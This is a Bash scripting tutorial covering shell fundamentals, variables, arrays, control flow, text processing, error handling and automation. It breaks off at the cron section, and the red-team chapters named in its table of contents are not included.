## TABLE OF CONTENTS

**PART I — FOUNDATIONS**

1. Introduction to Bash Scripting 1.1 What Bash Is and Where It Is Used 1.2 Bash vs Shell vs Other Interpreters 1.3 Script Execution Lifecycle
2. Linux Shell Fundamentals 2.1 Shell Environment 2.2 Shell Initialization Files 2.3 PATH and Environment Variables

**PART II — CORE BASH CONCEPTS** 3. Script Structure and Execution 3.1 Shebang Line 3.2 Script Permissions 3.3 Running Scripts Safely

4. Variables and Data Types 4.1 Variable Declaration and Scope 4.2 Quoting Rules 4.3 Command Substitution 4.4 Environment Variables
5. Arrays and Data Structures 5.1 Indexed Arrays 5.2 Associative Arrays 5.3 Iterating Over Arrays
6. String Manipulation 6.1 String Length and Substrings 6.2 Pattern Matching 6.3 Parameter Expansion
7. Input and Output Handling 7.1 User Input (read) 7.2 Standard Input, Output, Error 7.3 Redirection Operators 7.4 Pipes and Data Flow
8. Arithmetic Operations 8.1 Integer Arithmetic 8.2 let, (( )), and expr 8.3 Floating Point Considerations

**PART III — CONTROL FLOW** 9. Conditional Statements 9.1 if, elif, else 9.2 Test Operators 9.3 Logical Operators

10. Loops 10.1 for Loops 10.2 while and until Loops 10.3 Loop Control (break, continue)
11. Functions 11.1 Defining and Calling Functions 11.2 Function Arguments 11.3 Return Values and Exit Codes

**PART IV — INTERMEDIATE & ADVANCED BASH** 12. File and Directory Operations 12.1 File Tests 12.2 Permissions and Ownership 12.3 Path Handling

13. Process Management 13.1 Process Creation and Monitoring 13.2 Background and Foreground Jobs 13.3 Signals and Traps
14. Text Processing Tools 14.1 grep 14.2 awk 14.3 sed 14.4 Combining Tools with Pipelines
15. Error Handling and Debugging 15.1 Exit Codes and Failure Handling 15.2 Strict Mode (set -euo pipefail) 15.3 Debugging with set -x

**PART V — AUTOMATION & SYSTEM SCRIPTING** 16. Automation Principles 16.1 Writing Reliable Scripts 16.2 Idempotency and Safety

17. Task Automation 17.1 Cron Jobs 17.2 Timed and Conditional Execution
18. Logging and Monitoring 18.1 Log Generation 18.2 Log Parsing 18.3 Alerting Basics

**PART VI — SECURITY & RED TEAM BASH** 19. Bash in Offensive Security 19.1 Enumeration Automation 19.2 Recon Pipelines 19.3 Payload Wrappers

20. OPSEC Considerations 20.1 Noise Reduction 20.2 Temporary Files and Cleanup 20.3 Execution Timing
21. Defensive Awareness 21.1 Detectable Bash Patterns 21.2 Common Blue Team Indicators

**PART VII — PRACTICAL PROJECTS** 22. Practical Bash Projects 22.1 Log Analyzer Script 22.2 File Integrity Monitor 22.3 Process Watchdog 22.4 Recon Automation Tool 22.5 Backup and Cleanup Scripts

**PART VIII — COMMON MISTAKES & BEST PRACTICES** 23. Common Bash Pitfalls 23.1 Quoting Errors 23.2 Unsafe File Handling 23.3 Hardcoded Paths

24. Best Practices 24.1 Readability and Maintainability 24.2 Script Organization 24.3 Performance Considerations

**PART IX — REFERENCE** 25. Bash Cheat Sheet 25.1 Operators 25.2 Test Conditions 25.3 Parameter Expansion

26. Final Notes 26.1 When to Use Bash 26.2 When Not to Use Bash

---

# PART I — FOUNDATIONS

## 1. Introduction to Bash Scripting

### 1.1 What Bash Is and Where It Is Used

Bash (Bourne Again Shell) is a command interpreter that executes sequences of commands automatically. Instead of typing commands individually, scripts bundle them into executable files. Bash is the default shell on most Linux distributions and macOS.

**Primary use cases:**

- System administration and DevOps automation
- Task scheduling via cron
- Log processing and monitoring
- Deployment pipelines
- Penetration testing and security operations
- Data extraction and transformation

### 1.2 Bash vs Shell vs Other Interpreters

A shell is any command-line interface between the user and the operating system. Bash is one implementation among several:

**Common shells:**

- **Bash** (Bourne Again Shell) - Default on most systems, feature-rich
- **Sh** (Bourne Shell) - Original POSIX shell, minimal feature set
- **Ksh** (Korn Shell) - Enhanced with scripting improvements
- **Zsh** (Z Shell) - Extended Bash with interactive features
- **Csh/Tcsh** - C-like syntax
- **Fish** - User-friendly with autosuggestions

**Check your current shell:**

bash

```bash
echo $0
```

**List available shells:**

bash

````bash
cat /etc/shells
```

Bash dominates scripting due to widespread availability, extensive documentation, and backwards compatibility with sh.

### 1.3 Script Execution Lifecycle

When you execute a Bash script:

1. **Shebang interpretation** - System reads the first line to determine the interpreter
2. **Process creation** - A new shell process spawns
3. **Environment setup** - Variables, PATH, and settings are inherited or initialized
4. **Line-by-line execution** - Commands execute sequentially unless control structures alter flow
5. **Exit code return** - Script terminates with a status code (0 = success, non-zero = failure)

The script runs in a subshell by default, meaning variables and changes don't affect the parent shell unless sourced with `source` or `.`.

---

## 2. Linux Shell Fundamentals

### 2.1 Shell Environment

The shell environment consists of:
- **Working directory** - Current location in filesystem
- **Environment variables** - Configuration and state data
- **Aliases** - Command shortcuts
- **Functions** - Reusable code blocks
- **Command history** - Previously executed commands

The prompt displays environment information:
```
[username@hostname directory]$
````

### 2.2 Shell Initialization Files

Bash reads configuration files on startup:

**Login shells:**

- `/etc/profile` - System-wide settings
- `~/.bash_profile` or `~/.bash_login` or `~/.profile` - User-specific

**Interactive non-login shells:**

- `/etc/bash.bashrc` - System-wide
- `~/.bashrc` - User-specific

**On exit:**

- `~/.bash_logout`

Customizations like aliases, functions, and PATH modifications go in `~/.bashrc`.

### 2.3 PATH and Environment Variables

The PATH variable tells the shell where to find executables:

bash

```bash
echo $PATH
# /usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin
```

**Common environment variables:**

- `$HOME` - User's home directory
- `$USER` - Current username
- `$HOSTNAME` - Machine name
- `$PWD` - Present working directory
- `$OLDPWD` - Previous directory
- `$SHELL` - Path to current shell
- `$TERM` - Terminal type

**Setting environment variables:**

bash

```bash
export MY_VAR="value"
```

**Making permanent:** Add to `~/.bashrc`:

bash

```bash
echo 'export MY_VAR="value"' >> ~/.bashrc
source ~/.bashrc
```

---

# PART II — CORE BASH CONCEPTS

## 3. Script Structure and Execution

### 3.1 Shebang Line

The shebang (hashbang) is the first line specifying the interpreter:

bash

```bash
#!/bin/bash
```

**Common shebangs:**

bash

```bash
#!/bin/bash           # Bash-specific features
#!/bin/sh             # POSIX-compliant (portable)
#!/usr/bin/env bash   # Finds bash in PATH (recommended)
#!/bin/ksh            # Korn shell
```

The env-based shebang provides portability across systems where bash location varies. While not strictly mandatory, omitting the shebang risks execution with an unintended shell.

### 3.2 Script Permissions

File permissions control execution. Use `ls -l` to inspect:

bash

```bash
-rwxr-xr-x 1 user group 123 Nov 21 10:30 script.sh
```

**Permission breakdown:**

- First character: file type (- = file, d = directory)
- Next 3: owner (read, write, execute)
- Next 3: group
- Last 3: others

**Add execute permission:**

bash

```bash
chmod +x script.sh
```

**Granular control:**

bash

```bash
chmod 755 script.sh  # rwxr-xr-x
chmod 700 script.sh  # rwx------ (owner only)
```

### 3.3 Running Scripts Safely

**Execution methods:**

1. **Relative path** (requires execute permission):

bash

```bash
./script.sh
```

2. **Absolute path:**

bash

```bash
/home/user/scripts/script.sh
```

3. **Explicit interpreter** (no execute permission needed):

bash

```bash
bash script.sh
sh script.sh
```

4. **Source in current shell** (affects environment):

bash

```bash
source script.sh
. script.sh
```

**Security considerations:**

- Never add `.` to PATH (allows execution from current directory)
- Validate scripts before execution, especially from untrusted sources
- Use absolute paths for critical commands to prevent PATH hijacking
- Run with least privilege; avoid unnecessary sudo

---

## 4. Variables and Data Types

### 4.1 Variable Declaration and Scope

Bash variables are untyped but can hold strings or integers.

**Declaration:**

bash

```bash
name="value"           # No spaces around =
readonly CONST="fixed" # Immutable
declare -i num=10      # Integer hint
```

**Scope:**

- **Local** - Function-specific with `local` keyword
- **Global** - Available throughout script
- **Environment** - Exported to child processes with `export`

**Example:**

bash

```bash
#!/bin/bash
global_var="accessible everywhere"

my_function() {
    local local_var="only in function"
    echo $global_var
    echo $local_var
}

my_function
echo $global_var   # Works
echo $local_var    # Empty
```

### 4.2 Quoting Rules

Quoting controls expansion and interpretation:

**Double quotes** - Preserve string, allow variable expansion:

bash

```bash
name="Alice"
echo "Hello $name"  # Hello Alice
```

**Single quotes** - Literal string, no expansion:

bash

```bash
echo 'Hello $name'  # Hello $name
```

**No quotes** - Word splitting and globbing occur:

bash

```bash
files=$(ls *.txt)
echo $files   # Spaces collapsed, multiple words
echo "$files" # Preserves formatting
```

**Critical rule:** Always quote variables to prevent word splitting:

bash

```bash
file="my document.txt"
rm $file    # Tries to remove "my" and "document.txt" separately
rm "$file"  # Correct
```

### 4.3 Command Substitution

Capture command output in variables:

**Modern syntax:**

bash

```bash
current_date=$(date)
file_count=$(ls -1 | wc -l)
```

**Backtick syntax** (deprecated):

bash

```bash
current_date=`date`
```

**Nested substitution:**

bash

```bash
files=$(ls -1 $(pwd))
disk_usage=$(df -h / | awk 'NR==2 {print $5}')
```

### 4.4 Environment Variables

**Built-in variables:**

- `$0` - Script name
- `$1, $2, ..., $9` - Positional arguments
- `${10}, ${11}, ...` - Arguments beyond 9
- `$#` - Argument count
- `$@` - All arguments as separate words
- `$*` - All arguments as single word
- `$?` - Exit status of last command
- `$$` - Current process ID
- `$!` - PID of last background job
- `$_` - Last argument of previous command

**Example:**

bash

```bash
#!/bin/bash
echo "Script: $0"
echo "First arg: $1"
echo "All args: $@"
echo "Arg count: $#"
echo "PID: $$"
echo "Last exit code: $?"
```

---

## 5. Arrays and Data Structures

### 5.1 Indexed Arrays

Arrays store multiple values with numeric indices (zero-based).

**Declaration:**

bash

```bash
fruits=("Apple" "Banana" "Orange")
numbers=(1 2 3 4 5)

# Individual assignment
colors[0]="Red"
colors[1]="Green"
colors[2]="Blue"

# Explicit declaration
declare -a my_array
```

**Access:**

bash

```bash
echo ${fruits[0]}     # Apple
echo ${fruits[2]}     # Orange
echo ${fruits[@]}     # All elements
echo ${#fruits[@]}    # Array length
echo ${#fruits[1]}    # Length of element at index 1
```

**Modification:**

bash

```bash
fruits+=("Mango")              # Append
fruits+=("Grape" "Kiwi")       # Append multiple
unset fruits[1]                # Remove element
fruits=("${fruits[@]}" "Pear") # Append (alternative)
```

### 5.2 Associative Arrays

Key-value pairs (requires Bash 4.0+):

bash

```bash
declare -A person
person[name]="Alice"
person[age]=30
person[city]="Boston"

echo ${person[name]}    # Alice
echo ${person[@]}       # All values
echo ${!person[@]}      # All keys

# Iteration
for key in "${!person[@]}"; do
    echo "$key: ${person[$key]}"
done
```

### 5.3 Iterating Over Arrays

**For loop:**

bash

```bash
fruits=("Apple" "Banana" "Orange")

for fruit in "${fruits[@]}"; do
    echo "Fruit: $fruit"
done
```

**Index-based iteration:**

bash

```bash
for i in "${!fruits[@]}"; do
    echo "Index $i: ${fruits[$i]}"
done
```

**While loop with index:**

bash

```bash
i=0
while [ $i -lt ${#fruits[@]} ]; do
    echo ${fruits[$i]}
    ((i++))
done
```

---

## 6. String Manipulation

### 6.1 String Length and Substrings

**Length:**

bash

```bash
text="Hello World"
echo ${#text}  # 11
```

**Substring extraction:**

bash

```bash
# ${variable:offset:length}
echo ${text:0:5}   # Hello
echo ${text:6:5}   # World
echo ${text:6}     # World (to end)
echo ${text: -5}   # World (last 5 chars, note space)
```

### 6.2 Pattern Matching

**Remove prefix:**

bash

```bash
path="/home/user/documents/file.txt"
echo ${path#*/}      # home/user/documents/file.txt (shortest match)
echo ${path##*/}     # file.txt (longest match)
```

**Remove suffix:**

bash

```bash
filename="document.tar.gz"
echo ${filename%.*}   # document.tar (shortest)
echo ${filename%%.*}  # document (longest)
```

**Replace:**

bash

```bash
text="apple apple apple"
echo ${text/apple/orange}   # orange apple apple (first)
echo ${text//apple/orange}  # orange orange orange (all)
```

### 6.3 Parameter Expansion

**Case conversion:**

bash

```bash
text="Hello World"
echo ${text^^}   # HELLO WORLD (uppercase)
echo ${text,,}   # hello world (lowercase)
echo ${text^}    # Hello World (capitalize first)
```

**Default values:**

bash

```bash
echo ${var:-default}     # Use default if unset
echo ${var:=default}     # Assign default if unset
echo ${var:?error msg}   # Exit with error if unset
echo ${var:+alternate}   # Use alternate if set
```

**Pattern-based extraction:**

bash

```bash
text="The quick brown fox"
[[ $text == The* ]] && echo "Starts with The"
[[ $text == *fox ]] && echo "Ends with fox"
[[ $text == *brown* ]] && echo "Contains brown"
```

---

## 7. Input and Output Handling

### 7.1 User Input (read)

**Basic input:**

bash

```bash
read name
echo "Hello, $name"
```

**Prompt:**

bash

```bash
read -p "Enter your age: " age
```

**Multiple variables:**

bash

```bash
read -p "First and last name: " first last
```

**Array input:**

bash

```bash
read -a numbers -p "Enter numbers: "
echo ${numbers[@]}
```

**Silent input (passwords):**

bash

```bash
read -sp "Password: " password
echo ""
```

**Timeout:**

bash

```bash
read -t 5 -p "Quick (5s): " response
```

**Single character:**

bash

```bash
read -n 1 -p "Press any key..."
```

### 7.2 Standard Input, Output, Error

Three standard streams:

- **stdin (0)** - Input stream
- **stdout (1)** - Output stream
- **stderr (2)** - Error stream

**Using streams explicitly:**

bash

```bash
echo "Normal output" >&1
echo "Error message" >&2
read input <&0
```

### 7.3 Redirection Operators

**Output redirection:**

bash

```bash
command > file.txt        # Overwrite
command >> file.txt       # Append
command 2> error.txt      # Redirect stderr
command &> all.txt        # Redirect stdout and stderr
command > out.txt 2>&1    # Redirect both (older syntax)
```

**Input redirection:**

bash

```bash
command < input.txt
```

**Here documents:**

bash

```bash
cat <<EOF
Multiple lines
of text
EOF
```

**Here strings:**

bash

```bash
grep "pattern" <<< "$variable"
```

**Discard output:**

bash

```bash
command > /dev/null 2>&1
```

### 7.4 Pipes and Data Flow

Pass output as input between commands:

bash

```bash
command1 | command2 | command3
```

**Examples:**

bash

```bash
# Count unique IPs in log
cat access.log | awk '{print $1}' | sort | uniq -c | sort -nr

# Process list filtering
ps aux | grep nginx | awk '{print $2}'

# Pipeline with tee (split output)
command | tee output.txt | grep pattern

# Named pipes (FIFO)
mkfifo mypipe
command1 > mypipe &
command2 < mypipe
```

---

## 8. Arithmetic Operations

### 8.1 Integer Arithmetic

Bash handles integer arithmetic natively:

**Arithmetic expansion:**

bash

```bash
result=$((5 + 3))
echo $result  # 8

a=10
b=20
sum=$((a + b))
echo $sum  # 30
```

**Operators:**

- `+` Addition
- `-` Subtraction
- `*` Multiplication
- `/` Integer division
- `%` Modulus (remainder)
- `**` Exponentiation
- `++` Increment
- `--` Decrement

**Examples:**

bash

```bash
echo $((15 + 4))   # 19
echo $((15 - 4))   # 11
echo $((15 * 4))   # 60
echo $((15 / 4))   # 3 (integer division)
echo $((15 % 4))   # 3 (remainder)
echo $((2 ** 10))  # 1024

x=5
echo $((x++))      # 5 (post-increment)
echo $x            # 6
echo $((++x))      # 7 (pre-increment)
```

### 8.2 let, (( )), and expr

**let command:**

bash

```bash
let result=5+3
let a++ b-- c=a*b
```

**Double parentheses:**

bash

```bash
((result = 5 + 3))
((a++))
((b = a * 2))

# Conditional
if ((a > b)); then
    echo "a is greater"
fi
```

**expr (external command):**

bash

```bash
result=$(expr 5 + 3)
result=$(expr $a \* $b)  # Escape * to prevent globbing
```

### 8.3 Floating Point Considerations

Bash doesn't support floating point natively. Use `bc` or `awk`:

**bc calculator:**

bash

```bash
result=$(echo "10.5 + 20.3" | bc)
result=$(echo "scale=2; 10 / 3" | bc)  # Scale sets decimal places
result=$(echo "sqrt(16)" | bc)
```

**awk:**

bash

```bash
result=$(awk "BEGIN {print 10.5 + 20.3}")
result=$(awk "BEGIN {printf \"%.2f\", 10/3}")
```

---

# PART III — CONTROL FLOW

## 9. Conditional Statements

### 9.1 if, elif, else

**Basic if:**

bash

```bash
if [ condition ]; then
    commands
fi
```

**if-else:**

bash

```bash
if [ condition ]; then
    commands
else
    commands
fi
```

**if-elif-else:**

bash

```bash
if [ condition1 ]; then
    commands
elif [ condition2 ]; then
    commands
else
    commands
fi
```

**Example:**

bash

```bash
#!/bin/bash
score=85

if [ $score -ge 90 ]; then
    echo "A"
elif [ $score -ge 80 ]; then
    echo "B"
elif [ $score -ge 70 ]; then
    echo "C"
else
    echo "F"
fi
```

**Case statement:**

bash

```bash
case $variable in
    pattern1)
        commands
        ;;
    pattern2|pattern3)
        commands
        ;;
    *)
        default_commands
        ;;
esac
```

**Example:**

bash

```bash
read -p "Enter day (1-7): " day
case $day in
    1) echo "Monday" ;;
    2) echo "Tuesday" ;;
    6|7) echo "Weekend" ;;
    *) echo "Invalid" ;;
esac
```

### 9.2 Test Operators

**Integer comparison:**

- `-eq` Equal
- `-ne` Not equal
- `-gt` Greater than
- `-ge` Greater or equal
- `-lt` Less than
- `-le` Less or equal

**String comparison:**

- `=` or `==` Equal
- `!=` Not equal
- `<` Less than (lexicographic)
- `>` Greater than
- `-z` Empty string
- `-n` Non-empty string

**File tests:**

- `-f` Regular file exists
- `-d` Directory exists
- `-e` File/directory exists
- `-r` Readable
- `-w` Writable
- `-x` Executable
- `-s` Non-empty file
- `-L` Symbolic link
- `-nt` Newer than
- `-ot` Older than

**Examples:**

bash

```bash
if [ $a -eq $b ]; then echo "Equal"; fi
if [ "$str1" = "$str2" ]; then echo "Same"; fi
if [ -f "/etc/passwd" ]; then echo "File exists"; fi
if [ -d "/var/log" ]; then echo "Directory exists"; fi
```

### 9.3 Logical Operators

**Within test brackets:**

- `-a` AND
- `-o` OR
- `!` NOT

**Between test brackets:**

- `&&` AND
- `||` OR

**Examples:**

bash

```bash
# Within brackets
if [ $a -gt 0 -a $b -gt 0 ]; then
    echo "Both positive"
fi

# Between brackets (recommended)
if [ $a -gt 0 ] && [ $b -gt 0 ]; then
    echo "Both positive"
fi

# Negation
if [ ! -f "$file" ]; then
    echo "File doesn't exist"
fi

# Modern double brackets
if [[ $a -gt 0 && $b -gt 0 ]]; then
    echo "Both positive"
fi
```

**Short-circuit evaluation:**

bash

```bash
[ -f file.txt ] && echo "File exists"
[ -f file.txt ] || echo "File missing"
command1 && command2  # Run command2 only if command1 succeeds
command1 || command2  # Run command2 only if command1 fails
```

---

## 10. Loops

### 10.1 for Loops

**List iteration:**

bash

```bash
for item in one two three; do
    echo $item
done
```

**Range:**

bash

```bash
for i in {1..10}; do
    echo $i
done

for i in {0..100..10}; do  # Step by 10
    echo $i
done
```

**C-style:**

bash

```bash
for ((i=1; i<=10; i++)); do
    echo $i
done
```

**Array iteration:**

bash

```bash
files=(file1.txt file2.txt file3.txt)
for file in "${files[@]}"; do
    echo "Processing $file"
done
```

**Glob patterns:**

bash

```bash
for file in /var/log/*.log; do
    echo "Log: $file"
done
```

**Command substitution:**

bash

```bash
for user in $(cut -d: -f1 /etc/passwd); do
    echo "User: $user"
done
```

### 10.2 while and until Loops

**while loop:**

bash

```bash
while [ condition ]; do
    commands
done
```

**Example:**

bash

```bash
i=1
while [ $i -le 5 ]; do
    echo "Count: $i"
    ((i++))
done
```

**Reading file line by line:**

bash

```bash
while IFS= read -r line; do
    echo "Line: $line"
done < file.txt
```

**until loop (opposite of while):**

bash

```bash
i=1
until [ $i -gt 5 ]; do
    echo "Count: $i"
    ((i++))
done
```

**Infinite loop:**

bash

```bash
while true; do
    commands
done

# Alternative
while :; do
    commands
done
```

### 10.3 Loop Control (break, continue)

**break - Exit loop:**

bash

```bash
for i in {1..10}; do
    if [ $i -eq 5 ]; then
        break
    fi
    echo $i
done
# Output: 1 2 3 4
```

**continue - Skip iteration:**

bash

```bash
for i in {1..5}; do
    if [ $i -eq 3 ]; then
        continue
    fi
    echo $i
done
# Output: 1 2 4 5
```

**Nested loop control:**

bash

```bash
for i in {1..3}; do
    for j in {1..3}; do
        if [ $j -eq 2 ]; then
            break 2  # Break outer loop
        fi
        echo "$i,$j"
    done
done
```

---

## 11. Functions

### 11.1 Defining and Calling Functions

**Syntax:**

bash

```bash
function name {
    commands
}

# Alternative
name() {
    commands
}
```

**Example:**

bash

```bash
#!/bin/bash

greet() {
    echo "Hello, World!"
}

greet  # Call function
```

### 11.2 Function Arguments

Functions access arguments via positional parameters:

bash

```bash
#!/bin/bash

greet_user() {
    echo "Hello, $1!"
    echo "You are $2 years old"
}

greet_user "Alice" 30
# Output:
# Hello, Alice!
# You are 30 years old
```

**All arguments:**

bash

```bash
show_args() {
    echo "Number of args: $#"
    echo "All args: $@"
    for arg in "$@"; do
        echo "Arg: $arg"
    done
}

show_args one two three
```

### 11.3 Return Values and Exit Codes

Functions return exit codes (0-255):

bash

```bash
is_root() {
    [ "$(id -u)" -eq 0 ]
    return $?
}

if is_root; then
    echo "Running as root"
else
    echo "Not root"
fi
```

**Return via echo (output capture):**

bash

```bash
get_square() {
    local result=$(($1 * $1))
    echo $result
}

num=5
square=$(get_square $num)
echo "Square of $num is $square"
```

**Local variables:**

bash

```bash
calculate() {
    local temp=100
    result=$((temp * 2))
}

calculate
echo $result  # 200
echo $temp    # Empty (local to function)
```

---

# PART IV — INTERMEDIATE & ADVANCED BASH

## 12. File and Directory Operations

### 12.1 File Tests

Common file test operators:

bash

```bash
if [ -f "$file" ]; then echo "Regular file"; fi
if [ -d "$dir" ]; then echo "Directory"; fi
if [ -e "$path" ]; then echo "Exists"; fi
if [ -r "$file" ]; then echo "Readable"; fi
if [ -w "$file" ]; then echo "Writable"; fi
if [ -x "$file" ]; then echo "Executable"; fi
if [ -s "$file" ]; then echo "Not empty"; fi
if [ -L "$link" ]; then echo "Symbolic link"; fi
if [ "$file1" -nt "$file2" ]; then echo "Newer"; fi
if [ "$file1" -ot "$file2" ]; then echo "Older"; fi
```

**Checking multiple conditions:**

bash

```bash
if [ -f "$file" ] && [ -r "$file" ]; then
    cat "$file"
fi
```

### 12.2 Permissions and Ownership

**View permissions:**

bash

```bash
ls -l file.txt
# -rw-r--r-- 1 user group 123 Nov 21 10:30 file.txt
```

**Modify permissions:**

bash

```bash
chmod +x script.sh       # Add execute
chmod -w file.txt        # Remove write
chmod 755 script.sh      # rwxr-xr-x
chmod 644 file.txt       # rw-r--r--
chmod u+x,g+x script.sh  # Add execute for user and group
```

**Recursive:**

bash

```bash
chmod -R 755 directory/
```

**Change ownership:**

bash

```bash
chown user:group file.txt
chown -R user:group directory/
```

### 12.3 Path Handling

**Basename and dirname:**

bash

```bash
path="/home/user/documents/file.txt"
basename "$path"        # file.txt
dirname "$path"         # /home/user/documents
basename "$path" .txt   # file
```

**Absolute vs relative:**

bash

```bash
# Get absolute path
realpath relative/path
readlink -f relative/path

# Check if path is absolute
[[ "$path" = /* ]] && echo "Absolute"
```

**Path manipulation:**

bash

```bash
# Join paths safely
target="$directory/$filename"

# Remove trailing slash
path="${path%/}"

# Expand tilde
eval echo ~username/documents
```

---

Continue

2:48 AM

## 13. Process Management

### 13.1 Process Creation and Monitoring

**View processes:**

bash

```bash
ps aux
ps -ef
pgrep -a nginx
pidof nginx
```

**Process tree:**

bash

```bash
pstree
pstree -p $$  # Current shell's tree
```

**Monitor processes:**

bash

```bash
top
htop
```

**Kill processes:**

bash

```bash
kill PID
kill -9 PID      # Force kill
killall nginx
pkill -f pattern
```

### 13.2 Background and Foreground Jobs

**Background execution:**

bash

```bash
command &
long_running_task > output.log 2>&1 &
```

**Job control:**

bash

```bash
jobs              # List jobs
fg %1             # Bring job 1 to foreground
bg %1             # Resume job 1 in background
Ctrl+Z            # Suspend current job
```

**Disown jobs:**

bash

```bash
command &
disown           # Detach from shell
```

**Nohup (survive logout):**

bash

```bash
nohup command &
```

### 13.3 Signals and Traps

**Common signals:**

- `SIGTERM (15)` - Graceful termination
- `SIGKILL (9)` - Force kill
- `SIGINT (2)` - Interrupt (Ctrl+C)
- `SIGHUP (1)` - Hang up
- `SIGUSR1 (10)` - User-defined
- `SIGUSR2 (12)` - User-defined

**Trap handler:**

bash

```bash
#!/bin/bash

cleanup() {
    echo "Cleaning up..."
    rm -f /tmp/myapp.*
    exit
}

trap cleanup EXIT SIGINT SIGTERM

echo "Running... Press Ctrl+C to test cleanup"
sleep 100
```

**Ignore signals:**

bash

```bash
trap '' SIGINT  # Ignore Ctrl+C
```

**Reset trap:**

bash

```bash
trap - SIGINT
```

---

## 14. Text Processing Tools

### 14.1 grep

Search for patterns in text:

**Basic usage:**

bash

```bash
grep "pattern" file.txt
grep -i "pattern" file.txt        # Case-insensitive
grep -v "pattern" file.txt        # Invert (non-matching)
grep -r "pattern" directory/      # Recursive
grep -n "pattern" file.txt        # Line numbers
grep -c "pattern" file.txt        # Count matches
grep -l "pattern" *.txt           # Files with matches
grep -w "word" file.txt           # Whole word
```

**Extended regex:**

bash

```bash
grep -E "pattern1|pattern2" file.txt
egrep "pattern1|pattern2" file.txt
```

**Context:**

bash

```bash
grep -A 3 "pattern" file.txt  # 3 lines after
grep -B 3 "pattern" file.txt  # 3 lines before
grep -C 3 "pattern" file.txt  # 3 lines around
```

### 14.2 awk

Field-oriented text processing:

**Basic syntax:**

bash

```bash
awk 'pattern {action}' file
```

**Print columns:**

bash

```bash
awk '{print $1}' file.txt        # First column
awk '{print $1, $3}' file.txt    # First and third
awk '{print $NF}' file.txt       # Last column
```

**Patterns:**

bash

```bash
awk '/pattern/ {print $0}' file.txt
awk '$3 > 100 {print $1}' file.txt
awk 'NR==5 {print}' file.txt         # Line 5
awk 'NR>=5 && NR<=10' file.txt       # Lines 5-10
```

**Field separator:**

bash

```bash
awk -F: '{print $1}' /etc/passwd     # Colon delimiter
awk -F',' '{print $2}' data.csv      # CSV
```

**Built-in variables:**

- `NR` - Line number
- `NF` - Number of fields
- `FS` - Field separator
- `OFS` - Output field separator

**Examples:**

bash

```bash
# Sum column
awk '{sum+=$1} END {print sum}' file.txt

# Count occurrences
awk '{count[$1]++} END {for(key in count) print key, count[key]}' file.txt

# Format output
awk '{printf "%-10s %5d\n", $1, $2}' file.txt
```

### 14.3 sed

Stream editor for text transformation:

**Substitute:**

bash

```bash
sed 's/old/new/' file.txt            # First occurrence per line
sed 's/old/new/g' file.txt           # All occurrences
sed 's/old/new/2' file.txt           # Second occurrence
sed -i 's/old/new/g' file.txt        # In-place edit
```

**Delete lines:**

bash

```bash
sed '5d' file.txt                    # Delete line 5
sed '5,10d' file.txt                 # Delete lines 5-10
sed '/pattern/d' file.txt            # Delete matching lines
```

**Print specific lines:**

bash

```bash
sed -n '5p' file.txt                 # Print line 5
sed -n '5,10p' file.txt              # Print lines 5-10
sed -n '/pattern/p' file.txt         # Print matching lines
```

**Multiple operations:**

bash

```bash
sed -e 's/old/new/g' -e 's/foo/bar/g' file.txt
sed 's/old/new/g; s/foo/bar/g' file.txt
```

**Insert/append:**

bash

```bash
sed '5i\New line' file.txt           # Insert before line 5
sed '5a\New line' file.txt           # Append after line 5
```

### 14.4 Combining Tools with Pipelines

**Common patterns:**

bash

```bash
# Extract and count unique IPs
cat access.log | awk '{print $1}' | sort | uniq -c | sort -nr

# Find large files
find / -type f -size +100M 2>/dev/null | xargs ls -lh | awk '{print $5, $9}'

# Parse CSV
cut -d',' -f1,3 data.csv | sort -u

# Log analysis
grep ERROR app.log | cut -d' ' -f1,4- | sort | uniq -c

# Complex filtering
ps aux | grep -v grep | awk '$3 > 50 {print $2, $3, $11}'
```

---

## 15. Error Handling and Debugging

### 15.1 Exit Codes and Failure Handling

Every command returns an exit code (0 = success):

bash

```bash
command
echo $?  # Check exit code
```

**Conditional execution:**

bash

```bash
if command; then
    echo "Success"
else
    echo "Failed"
fi

command && echo "Success" || echo "Failed"
```

**Explicit exit:**

bash

```bash
if [ ! -f "$file" ]; then
    echo "Error: File not found"
    exit 1
fi
```

**Function returns:**

bash

```bash
validate_input() {
    [ -n "$1" ] || return 1
    [ "$1" -gt 0 ] || return 2
    return 0
}
```

### 15.2 Strict Mode (set -euo pipefail)

Enable strict error handling:

bash

```bash
#!/bin/bash
set -euo pipefail

# -e: Exit on error
# -u: Exit on undefined variable
# -o pipefail: Pipeline fails if any command fails
```

**Example:**

bash

```bash
#!/bin/bash
set -euo pipefail

mkdir /test/dir      # Fails, script exits
echo "This won't run"
```

**Selective error handling:**

bash

```bash
set -e
command || true      # Prevent exit on failure
command || {
    echo "Failed but continuing"
}
set +e               # Disable exit on error
```

### 15.3 Debugging with set -x

Trace execution:

bash

```bash
#!/bin/bash
set -x               # Enable tracing
command1
command2
set +x               # Disable tracing
```

**Run script with tracing:**

bash

```bash
bash -x script.sh
```

**Conditional tracing:**

bash

```bash
[ "$DEBUG" = "1" ] && set -x
```

**Custom debugging:**

bash

```bash
#!/bin/bash

DEBUG=${DEBUG:-0}

debug() {
    [ "$DEBUG" -eq 1 ] && echo "[DEBUG] $*" >&2
}

debug "Starting process"
command
debug "Process complete"
```

---

# PART V — AUTOMATION & SYSTEM SCRIPTING

## 16. Automation Principles

### 16.1 Writing Reliable Scripts

**Error handling checklist:**

- Use `set -euo pipefail`
- Quote all variables
- Check command existence before use
- Validate inputs
- Provide meaningful error messages
- Log operations

**Example template:**

bash

```bash
#!/bin/bash
set -euo pipefail

readonly SCRIPT_NAME=$(basename "$0")
readonly LOG_FILE="/var/log/${SCRIPT_NAME%.sh}.log"

log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $*" | tee -a "$LOG_FILE"
}

error_exit() {
    log "ERROR: $*"
    exit 1
}

# Check prerequisites
command -v required_tool >/dev/null || error_exit "required_tool not found"

# Validate input
[ $# -eq 1 ] || error_exit "Usage: $SCRIPT_NAME <argument>"

log "Starting $SCRIPT_NAME"
# Main logic
log "Completed successfully"
```

### 16.2 Idempotency and Safety

Scripts should produce the same result when run multiple times:

bash

```bash
# Check before creating
if [ ! -d "/opt/myapp" ]; then
    mkdir -p /opt/myapp
fi

# Atomic operations
temp_file=$(mktemp)
process_data > "$temp_file"
mv "$temp_file" /etc/config  # Atomic replacement

# Backup before modification
cp "$config" "${config}.backup"
modify_config "$config"
```

---

## 17. Task Automation

### 17.1 Cron Jobs

Schedule recurring tasks:

**Edit crontab:**

bash

````bash
crontab -e
```

**Crontab syntax:**
```
# ┌───────────── minute (0-59)
# │ ┌───────────── hour (0-23)
